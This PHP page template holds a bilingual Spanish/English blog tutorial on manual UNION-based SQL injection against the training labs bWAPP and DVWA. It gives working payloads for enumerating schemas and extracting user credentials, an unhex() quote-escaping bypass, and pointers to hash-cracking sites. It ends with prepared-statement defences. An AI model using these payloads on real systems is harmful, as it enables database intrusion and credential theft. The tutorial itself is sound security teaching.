<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'SQL Injection Manual: bWAPP y DVWA — CyberEscudo' : 'Manual SQL Injection: bWAPP & DVWA — CyberEscudo';
$contentTitle = $lang==='es' ? 'SQL Injection Manual: bWAPP y DVWA' : 'Manual SQL Injection: bWAPP & DVWA';
$contentDate  = '2022-01-15';
$contentTags  = ['SQL Injection','bWAPP','DVWA','UNION','Pentesting'];
ob_start();
if ($lang==='es'): ?>
<div class="prose">
  <p>Práctica de explotación manual de <strong>SQL Injection</strong> mediante sentencias UNION en bWAPP y DVWA. La inyección basada en UNION es una de las técnicas más comunes y potentes: nos permite "unir" los resultados de la consulta legítima de la base de datos con los resultados de una consulta maliciosa inyectada por nosotros.</p>

  <h2>1. bWAPP — SQL Injection (Search/GET)</h2>
  <p>Accedemos a bWAPP con la IP de la máquina, usuario y contraseña por defecto, y seleccionamos el módulo <em>SQL Injection (Search/GET)</em>.</p>

  <h3>Paso 1: Detectar número de columnas</h3>
  <p>Para que el operador <code>UNION</code> funcione en SQL, nuestra consulta inyectada debe solicitar exactamente el mismo número de columnas que la consulta original. Usamos números incrementales hasta que la web deja de dar error de sintaxis y nos muestra los números en pantalla.</p>
  <pre><code>' union select 1,2,3,4,5,6,7#</code></pre>

  <h3>Paso 2: Obtener nombre del esquema actual</h3>
  <p>Una vez sabemos que hay 7 columnas (y vemos cuáles se imprimen en pantalla, por ejemplo la 2, 3, 4 y 5), sustituimos uno de esos números por funciones nativas de MySQL como <code>database()</code> para descubrir en qué base de datos estamos operando o <code>user()</code> para ver nuestro nivel de privilegios.</p>
  <pre><code>' union select 1,2,3,database(),5,6,7#</code></pre>

  <h3>Paso 3: Listar tablas del esquema</h3>
  <p>En MySQL, existe una base de datos maestra llamada <code>information_schema</code> que guarda el registro de todas las demás bases de datos, tablas y columnas. La atacamos usando la función <code>group_concat()</code>. Esta función es vital porque agrupa múltiples resultados en una sola cadena de texto, evitando que la web solo nos muestre la primera fila.</p>
  <pre><code>' union select 1,2,3,4,group_concat(table_name),6,7
FROM information_schema.tables
WHERE table_schema=database()#</code></pre>

  <h3>Paso 4: Listar columnas de la tabla 'users'</h3>
  <p>Sabiendo que existe una tabla llamada <code>users</code>, volvemos a consultar a <code>information_schema</code> (esta vez a la tabla <code>columns</code>) para descubrir los nombres exactos de las columnas donde se guardan las credenciales.</p>
  <pre><code>' union select 1,2,group_concat(column_name),4,5,6,7
FROM information_schema.columns
WHERE table_name='users' AND table_schema=database()#</code></pre>

  <h3>Paso 5: Extraer credenciales</h3>
  <p>Ahora que conocemos el nombre de la tabla y sus columnas, hacemos la consulta final extrayendo los datos puros. Las contraseñas suelen estar hasheadas (en este caso en <strong>SHA1</strong>). Puedes intentar romper los hashes usando diccionarios en sitios como <a href="https://md5decrypt.net/en/Sha1/" target="_blank">md5decrypt.net/en/Sha1/</a> o herramientas como Hashcat.</p>
  <pre><code>' union select 1,login,password,email,secret,6,7 FROM users#</code></pre>

  <h2>2. DVWA — Bypass de filtros con unhex()</h2>
  <p>En el nivel de seguridad "Medium", DVWA aplica la función <code>mysql_real_escape_string()</code>. Esta función de PHP busca caracteres peligrosos (como la comilla simple <code>'</code>) y les pone una barra invertida delante (<code>\'</code>) para neutralizarlos y evitar que rompan la consulta.</p>
  
  <p><strong>El Bypass:</strong> Para evadir este filtro, evitamos escribir comillas directamente. En su lugar, usamos la función <code>unhex()</code> de MySQL, pasándole el código hexadecimal del carácter que queremos usar (por ejemplo, <code>27</code> es el valor hexadecimal de la comilla simple). De esta forma, el filtro de PHP no ve comillas y lo deja pasar, pero el motor SQL sí lo interpreta correctamente.</p>

  <h3>Detectar número de columnas evadiendo comillas</h3>
  <pre><code>unhex(27) or 1=1 order by 2#</code></pre>

  <h3>Listar tablas del esquema actual</h3>
  <p>Al igual que en bWAPP, usamos el esquema de información, inyectándolo de forma segura detrás de nuestro bypass.</p>
  <pre><code>unhex(27) union select 1, table_name
FROM information_schema.tables
WHERE table_schema=database()#</code></pre>

  <h3>Extraer usuarios y contraseñas</h3>
  <pre><code>unhex(27) union select user,password FROM dvwa.users#</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> ¡Ponlo en práctica!
      </h3>
      <p style="margin-bottom: 1.5rem;">He creado un entorno seguro simulado (CTF) donde puedes intentar hacer un bypass de autenticación utilizando los conceptos de este manual. Si lo logras, obtendrás una bandera canjeable en la terminal.</p>
      <a href="/ctf/ctf-01.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 01
      </a>
  </div>

  <h2>Contramedidas y Mitigación</h2>
  <p>La inyección SQL existe porque los datos no confiables suministrados por el usuario se mezclan directamente con la sintaxis del código de la base de datos. Para evitarlo de raíz:</p>
  <ul>
    <li><strong>Prepared Statements (Consultas Parametrizadas):</strong> Es la defensa absoluta. Envía la estructura de la consulta al servidor SQL primero y luego pasa los datos del usuario como variables estrictas. Así es imposible alterar la lógica de la consulta.</li>
    <li><strong>ORMs (Object-Relational Mapping):</strong> Frameworks como Eloquent (Laravel) o Hibernate implementan consultas parametrizadas internamente por defecto.</li>
    <li><strong>Validación estricta de entradas:</strong> Usar listas blancas (ej. asegurarse de que un ID sea siempre y únicamente numérico antes de tocar la base de datos).</li>
    <li><strong>WAF (Web Application Firewall):</strong> Implementar Mod_Security con reglas como las de OWASP Core Rule Set para bloquear intentos de inyección antes de que lleguen a la aplicación web.</li>
  </ul>
  
  <p>Ejemplo de código seguro usando PDO en PHP:</p>
  <pre><code>&lt;?php
// Ejemplo con PDO (prepared statement):
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]); // El input nunca se concatena
$user = $stmt->fetch();
?&gt;</code></pre>
</div>

<?php else: ?>
<div class="prose">
  <p>A manual practice guide for exploiting <strong>SQL Injection</strong> vulnerabilities using UNION statements on bWAPP and an <code>unhex()</code> evasion technique on DVWA. UNION-based injection is a powerful technique that allows an attacker to append the results of their own malicious query to the results of the legitimate database request.</p>

  <h2>1. bWAPP — UNION-based Injection</h2>
  <p>Log into bWAPP using the default credentials and select the <em>SQL Injection (Search/GET)</em> module.</p>

  <h3>Step 1: Finding the number of columns</h3>
  <p>For a <code>UNION</code> operation to succeed, the injected query must return the exact same number of columns as the original query. We increment the numbers until the page stops throwing a syntax error.</p>
  <pre><code">' union select 1,2,3,4,5,6,7#</code></pre>
  
  <h3>Step 2: Enumerating the Database</h3>
  <p>Once we identify the columns reflected on the screen, we substitute them with SQL functions like <code>database()</code> to reveal our current schema. Then, we query <code>information_schema.tables</code> (MySQL's meta-database) using <code>group_concat()</code> to output all table names into a single readable string.</p>
  <pre><code">' union select 1,2,3,database(),5,6,7#
' union select 1,2,3,4,group_concat(table_name),6,7 FROM information_schema.tables WHERE table_schema=database()#</code></pre>

  <h3>Step 3: Extracting Credentials</h3>
  <p>After pinpointing the <code>users</code> table, we query its contents directly. Passwords are usually hashed (SHA1 in this case). You can crack them using wordlists on sites like <a href="https://md5decrypt.net/en/Sha1/" target="_blank">md5decrypt.net/en/Sha1/</a>.</p>
  <pre><code">' union select 1,login,password,email,secret,6,7 FROM users#</code></pre>

  <h2>2. DVWA Medium — unhex() Bypass</h2>
  <p>DVWA's medium security level applies the <code>mysql_real_escape_string()</code> PHP function. This attempts to neutralize quotes (<code>'</code>) by escaping them (<code>\'</code>), preventing us from breaking out of string contexts.</p>
  <p><strong>The Bypass:</strong> Instead of typing a literal single quote, we use MySQL's built-in <code>unhex()</code> function and pass it the hex value of the character we need (e.g., <code>27</code> is the hex code for a single quote). The PHP filter allows it through, but the SQL engine interprets it back into a quote!</p>
  <pre><code>unhex(27) or 1=1 order by 2#
unhex(27) union select 1, table_name FROM information_schema.tables WHERE table_schema=database()#
unhex(27) union select user,password FROM dvwa.users#</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Put it into practice!
      </h3>
      <p style="margin-bottom: 1.5rem;">I have created a secure simulated environment (CTF) where you can try an authentication bypass using the concepts from this manual. If you succeed, you'll get a flag redeemable in the terminal.</p>
      <a href="/ctf/ctf-01.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 01 CHALLENGE
      </a>
  </div>

  <h2>Defensive Measures</h2>
  <p>SQL injection occurs when untrusted user input is directly concatenated into database queries. To completely eradicate this class of vulnerability:</p>
  <ul>
      <li><strong>Prepared Statements (Parameterized Queries):</strong> The absolute best defense. The database engine compiles the SQL query structure first, and then user input is supplied strictly as data parameters, never as executable code.</li>
      <li><strong>Input Validation:</strong> Strictly enforce allowlists (e.g., verify that an ID is purely numeric).</li>
      <li><strong>Web Application Firewalls (WAF):</strong> Deploy WAFs to detect and block common SQLi signatures in transit.</li>
  </ul>
  <p>Secure PHP implementation using PDO:</p>
  <pre><code>&lt;?php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]); // Input is securely bound
$user = $stmt->fetch();
?&gt;</code></pre>
</div>
<?php endif;
$contentBody=ob_get_clean();
require __DIR__.'/../templates/content-page.php';